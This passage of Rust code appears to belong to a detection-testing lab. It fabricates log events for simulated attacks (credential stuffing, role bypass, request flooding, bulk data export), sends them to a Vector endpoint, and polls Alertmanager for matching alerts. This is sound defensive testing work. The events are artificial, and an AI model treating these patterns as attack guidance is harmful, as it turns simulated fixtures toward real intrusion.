                            "Message": format!("Access denied to {}", path),
                            "SourceType": "dotnet",
                            "Host": "api-01",
                            "Properties": {
                                "ClientIp": attacker_ips[4],
                                "RequestMethod": "GET",
                                "RequestPath": *path,
                                "StatusCode": 403,
                                "Elapsed": 10
                            }
                        }));
                    }
                }
                // Role bypass
                events.push(serde_json::json!({
                    "Timestamp": now,
                    "Level": "Warning",
                    "Message": "Admin panel accessed",
                    "SourceType": "dotnet",
                    "Host": "api-01",
                    "Properties": {
                        "ClientIp": attacker_ips[4],
                        "RequestMethod": "GET",
                        "RequestPath": "/api/admin/dashboard",
                        "StatusCode": 200,
                        "Elapsed": 30,
                        "UserId": "user-analyst",
                        "UserRole": "analyst"
                    }
                }));
            }
            // 7: Rate Limit
            7 => {
                for i in 0..600 {
                    events.push(serde_json::json!({
                        "Timestamp": now,
                        "Level": "Information",
                        "Message": format!("HTTP GET /api/products/{} responded 200 in 5ms", i),
                        "SourceType": "dotnet",
                        "Host": "api-01",
                        "Properties": {
                            "ClientIp": attacker_ips[5],
                            "RequestMethod": "GET",
                            "RequestPath": format!("/api/products/{}", i),
                            "StatusCode": 200,
                            "Elapsed": 5
                        }
                    }));
                }
            }
            // 8: Error Spike
            8 => {
                for i in 0..25 {
                    events.push(serde_json::json!({
                        "Timestamp": now,
                        "Level": "Error",
                        "Message": "Unhandled exception on /api/orders: NullReferenceException",
                        "SourceType": "dotnet",
                        "Host": "api-01",
                        "Properties": {
                            "ClientIp": attacker_ips[2],
                            "RequestMethod": "POST",
                            "RequestPath": "/api/orders",
                            "StatusCode": 500,
                            "Elapsed": 200 + i
                        }
                    }));
                }
            }
            // 9: Credential Stuffing
            9 => {
                for ip in attacker_ips.iter().take(6) {
                    events.push(serde_json::json!({
                        "Timestamp": now,
                        "Level": "Error",
                        "Message": "HTTP POST /api/auth/login responded 401 in 35ms",
                        "SourceType": "dotnet",
                        "Host": "api-01",
                        "Properties": {
                            "ClientIp": ip,
                            "RequestMethod": "POST",
                            "RequestPath": "/api/auth/login",
                            "StatusCode": 401,
                            "Elapsed": 35,
                            "UserId": "admin@company.com"
                        }
                    }));
                }
            }
            // 10: Unusual HTTP Methods
            10 => {
                let scenarios = [
                    ("DELETE", "/api/admin/users/5", 200),
                    ("PUT", "/api/config/settings", 200),
                    ("PATCH", "/api/permissions/role", 200),
                    ("DELETE", "/api/secrets/api-key", 403),
                ];
                for (i, (method, path, status)) in scenarios.iter().enumerate() {
                    events.push(serde_json::json!({
                        "Timestamp": now,
                        "Level": if *status == 200 { "Warning" } else { "Error" },
                        "Message": format!("HTTP {} {} responded {}", method, path, status),
                        "SourceType": "dotnet",
                        "Host": "api-01",
                        "Properties": {
                            "ClientIp": attacker_ips[i % attacker_ips.len()],
                            "RequestMethod": *method,
                            "RequestPath": *path,
                            "StatusCode": *status,
                            "Elapsed": 20,
                            "UserId": "attacker"
                        }
                    }));
                }
            }
            // 11: Data Exfiltration
            11 => {
                for i in 0..100 {
                    events.push(serde_json::json!({
                        "Timestamp": now,
                        "Level": "Information",
                        "Message": "HTTP GET /api/reports/export responded 200 in 5200ms",
                        "SourceType": "dotnet",
                        "Host": "api-01",
                        "Properties": {
                            "ClientIp": attacker_ips[3],
                            "RequestMethod": "GET",
                            "RequestPath": "/api/reports/export",
                            "StatusCode": 200,
                            "Elapsed": 5200,
                            "UserId": "user-suspicious",
                            "ResponseSize": 5_000_000 + i * 100_000
                        }
                    }));
                }
            }
            _ => {}
        }

        events
    }

    fn run_attack(
        vector_url: &str,
        alertmanager_url: &str,
        rule_id: &str,
        attack_name: &str,
        events: Vec<serde_json::Value>,
    ) -> AttackLabResult {
        let client = match reqwest::blocking::Client::builder()
            .timeout(std::time::Duration::from_secs(15))
            .build()
        {
            Ok(c) => c,
            Err(e) => {
                return AttackLabResult {
                    attack_name: attack_name.to_string(),
                    rule_id: rule_id.to_string(),
                    events_sent: 0,
                    events_failed: events.len(),
                    alert_detected: false,
                    alert_severity: String::new(),
                    alert_description: format!("HTTP client error: {}", e),
                };
            }
        };

        // Send events to Vector in batches of 50
        let batch_size = 50;
        let mut sent = 0usize;
        let mut failed = 0usize;

        for chunk in events.chunks(batch_size) {
            let ndjson: String = chunk
                .iter()
                .map(|e| serde_json::to_string(e).unwrap_or_default())
                .collect::<Vec<_>>()
                .join("\n");

            match client
                .post(vector_url)
                .header("Content-Type", "application/x-ndjson")
                .body(ndjson)
                .send()
            {
                Ok(resp) => {
                    if resp.status().as_u16() < 300 {
                        sent += chunk.len();
                    } else {
                        failed += chunk.len();
                    }
                }
                Err(_) => {
                    failed += chunk.len();
                }
            }
        }

        if sent == 0 {
            return AttackLabResult {
                attack_name: attack_name.to_string(),
                rule_id: rule_id.to_string(),
                events_sent: 0,
                events_failed: failed,
                alert_detected: false,
                alert_severity: String::new(),
                alert_description: "Failed to send any events to Vector".to_string(),
            };
        }

        // Poll Alertmanager for up to 45 seconds
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(45);
        let mut alert_detected = false;
        let mut alert_severity = String::new();
        let mut alert_description = String::new();

        while std::time::Instant::now() < deadline {
            std::thread::sleep(std::time::Duration::from_secs(3));

            let alerts_url = format!("{}/api/v2/alerts", alertmanager_url);
            match client.get(&alerts_url).send() {
                Ok(resp) if resp.status().is_success() => {
                    if let Ok(alerts) = resp.json::<Vec<serde_json::Value>>() {
                        for a in &alerts {
                            let labels = a.get("labels").cloned().unwrap_or_default();
                            let rid = labels.get("rule_id").and_then(|v| v.as_str()).unwrap_or("");
                            if rid == rule_id {
                                alert_detected = true;
                                alert_severity = labels
                                    .get("severity")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or("unknown")
                                    .to_string();
                                let annotations = a.get("annotations").cloned().unwrap_or_default();
                                alert_description = annotations
                                    .get("description")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or("")
                                    .to_string();
                                break;
                            }
                        }
                    }
                }
                _ => {}
            }

            if alert_detected {
                break;
            }
        }

        AttackLabResult {
            attack_name: attack_name.to_string(),
            rule_id: rule_id.to_string(),
            events_sent: sent,
            events_failed: failed,
            alert_detected,
            alert_severity,
            alert_description,
        }
    }
}
